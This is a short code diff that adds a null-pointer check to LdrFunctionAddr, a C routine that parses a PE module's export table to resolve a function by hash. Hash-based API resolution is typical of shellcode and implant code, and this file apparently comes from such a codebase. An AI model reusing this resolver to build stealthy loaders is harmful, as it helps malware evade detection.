@@ -387,6 +387,9 @@ PVOID LdrFunctionAddr(
     PCHAR                   FunctionName     = { 0 };
     ANSI_STRING             AnsiString       = { 0 };
 
+    if ( ! Module || ! Hash )
+        return NULL;
+
     NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
     ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
     ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );
